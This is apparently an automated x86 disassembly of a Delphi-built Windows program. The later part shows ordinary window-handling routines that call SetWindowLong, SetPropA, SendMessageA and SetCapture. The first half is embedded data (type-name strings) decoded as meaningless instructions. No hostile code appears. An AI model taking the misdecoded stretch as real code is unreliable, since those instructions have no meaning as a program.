inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
push esp
push ebx
push 0x53746669
adc [ ecx ] dl
inc eax
add ah al
push 0x43
add al ch
cmp al [ ecx ]
cmp al 0x10
inc eax
add [ eax + edx ] bh
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
adc [ ecx ] dl
inc eax
add [ eax + edx ] bh
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
push ebx
outsb
jb r-xdata
jb r-xdata
je r-xdata
inc edx
jne r-xdata
adc [ ecx ] dl
inc eax
add al bl
inc ebx
add [ eax + 0x8004373 ] ah
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
inc esp
jb r-xdata
pop es
dec eax
imul esi [ esp + edx * 2 + 0x65 ] 0x49077473
outsb
je r-xdata
push 0x53746669
je r-xdata
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
je r-xdata
je r-xdata
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
adc [ ecx ] dl
inc eax
add [ eax ] dl
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x436b ] dh
adc [ eax ] al
nop
clc
jb r-xdata
cmp al 0x10
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
jns r-xdata
jb r-xdata
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x73580040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
je r-xdata
push esp
push ebx
push 0x53746669
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
jb r-xdata
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add ah bh
jae r-xdata
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x10 ] si
adc [ eax ] eax
fsub [ ebx + eax * 2 ]
mov al [ 0x8004373 ]
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
outsb
je r-xdata
adc [ ecx ] dl
inc eax
add [ edi + 0x43 ] bh
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x74640040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
adc [ ecx ] dl
inc eax
add [ eax ] dl
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
jb r-xdata
popad
outsb
add [ eax ] dl
adc [ eax ] eax
jl r-xdata
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc esp
outsd
insb
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc ebx
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
pop es
inc ebx
add [ ebp + esi * 2 + 0x11080043 ] ch
push esp
inc edi
je r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x10 ] si
adc [ eax ] eax
jl r-xdata
add ah ch
test [ ebx ] al
add [ eax ] dl
inc eax
add [ eax + 0x75 ] ah
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x436b ] dh
adc [ eax ] al
nop
hlt
adc [ ecx ] dl
inc eax
add [ edi + 0x43 ] bh
outsb
je r-xdata
jbe r-xdata
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp [ esi + 0x43 ] dh
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push 0x65
jb r-xdata
inc ebx
jpe r-xdata
pop esp
jpo r-xdata
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
outsb
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
inc ebx
popad
add [ edi ] eax
jne r-xdata
or [ ebp + 0x6f ] cl
add [ eax ] dl
adc [ eax ] eax
pop esp
jpo r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add eax 0x65530608
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4377c0c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x437738c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
outsb
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
shl [ edi + 0x43 ] 0x0
or [ esi ] dl
je r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
jbe r-xdata
inc ebp
push edx
jae r-xdata
push es
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x52004379 ] al
jpo r-xdata
js r-xdata
insb
outsd
ja r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
adc [ ecx ] dl
inc eax
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
add [ eax ] ecx
arpl [ ecx + eax + 0x8 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
jpe r-xdata
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc ebx
add [ eax ] al
loop r-xdata
add [ eax + 0x70000001 ] dl
push eax
add [ eax ] al
jo r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
test al 0x76
inc ebx
add [ eax ] cl
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
js r-xdata
outsb
je r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc al 0xbf
inc ebx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add [ eax + eax * 8 ] bl
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
lodsb [ esi ]
xlat
inc ebx
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
inc ebx
add al dl
inc ecx
add al ch
loope r-xdata
jo r-xdata
add [ eax + 0x50 ] dh
inc ebp
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x78d80040 ] cl
inc ebx
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
call 0x3c43b8e9
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add al 0x8
push es
inc ebx
add [ eax ] dh
retn
sbb al 0xc0
rol [ ebx ] 0x1
int3
add [ eax - 0x2fffbc51 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] ch
inc ebx
add [ eax + 0x7b ] ah
inc ebx
add [ eax ] al
lea eax [ eax ]
fdivr [ eax + 0x43 ]
jbe r-xdata
add [ edx + 0x7b ] dl
inc ebx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
call sub_43b963
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xor al 0x78
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add [ eax - 0x7fffbc50 ] bl
call 0xffffffffdaeb7921
inc ebx
add al cl
insd
inc ecx
add [ eax - 0x18 ] cl
inc ebx
add [ esp + esi * 4 + 0x43 ] ah
add al dl
mov bl 0x43
add [ eax ] dh
mov edi 0xe2000043
inc ecx
push eax
outsd
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
sub_438108
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx - 0x7b0fffbd ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7e ] al
inc ebx
add dh bl
test [ ebx ] al
dec esp
add al [ eax ]
add [ eax + edi * 2 - 0x1e17ffbd ] cl
inc ecx
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
pop esp
adc al 0x44
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] cl
out dx eax
inc ebx
add [ eax + 0x48 ] cl
inc esp
add al al
add eax 0x6dc80044
inc ecx
add [ eax - 0x18 ] cl
inc ebx
add al bl
inc [ ebx ]
mov esp 0x300043f0
mov edi 0xe2000043
inc ecx
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
jl r-xdata
add ah al
in eax dx
inc ebx
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x3d500044
inc esp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax ] bl
0xea440043 0x43
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x4fffbc81 ] bl
add [ eax ] eax
add [ esi + edi * 2 + 0x1bc0043 ] al
add [ eax ] al
outsd
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ecx ] ah
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb04cb02c
xor esi [ eax - 0x4fc74fcc ]
cmp [ eax - 0x4fc34fc6 ] esi
adc dh [ eax - 0x10fce8 ]
out dx al
inc esp
add [ eax ] dh
retn
sub_438814
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov [ ebx ] al
sub [ eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_438a04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
mov al [ ebx ]
xor [ eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ esp + ecx * 4 + 0x44 ] ch
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
mov eax [ eax + 0x1c0 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
nop
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x1b4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x1c0 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax + 0x1c0 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
jmp r-xdata
sub_438b64
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_438b98
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_405324
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_438b64
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_438bf4
push ebx
mov ebx eax
mov eax ebx
call sub_438b98
test eax eax
setne al
test al al
jne r-xdata
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call [ rw-data ]
sub_438c24
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_438e08
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40e924
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_405384
mov eax edi
mov edx esi
call sub_404e98
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438e4c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40e924
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_405384
mov eax edi
mov edx esi
call sub_404e98
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438e90
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43d400
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_438f0c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
mov eax ebx
call sub_443be8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_438fb8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
xor eax eax
mov [ edi ] eax
xor ebx ebx
jmp r-xdata
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov edx [ edi ]
mov eax esi
call sub_4167c8
cmp ebp [ eax + 0x4 ]
sete bl
test bl bl
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ edi ]
sub_438ff0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443be8
mov ebx eax
mov esi ebx
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov esi ebx
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43901c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_402d28
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_438ff0
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_438fb8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416668
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4167c8
mov edi eax
mov eax [ edi ]
call sub_443be8
push eax
mov eax [ ebx ]
call sub_443be8
push eax
call IsChild
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416844
jmp r-xdata
inc [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4390a0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41669c
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4167c8
mov edx 0x8
call sub_402d44
inc esi
dec ebx
jne r-xdata
sub_4390d4
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4167c8
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_438fb8
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_439138
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
retn
sub_439198
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403e44
mov edx esp
mov eax esi
call sub_4050a8
add esp 0x100
pop esi
pop ebx
retn
sub_4391d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4392d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ edx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43a340
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0x10
call sub_439cb0
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ edx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
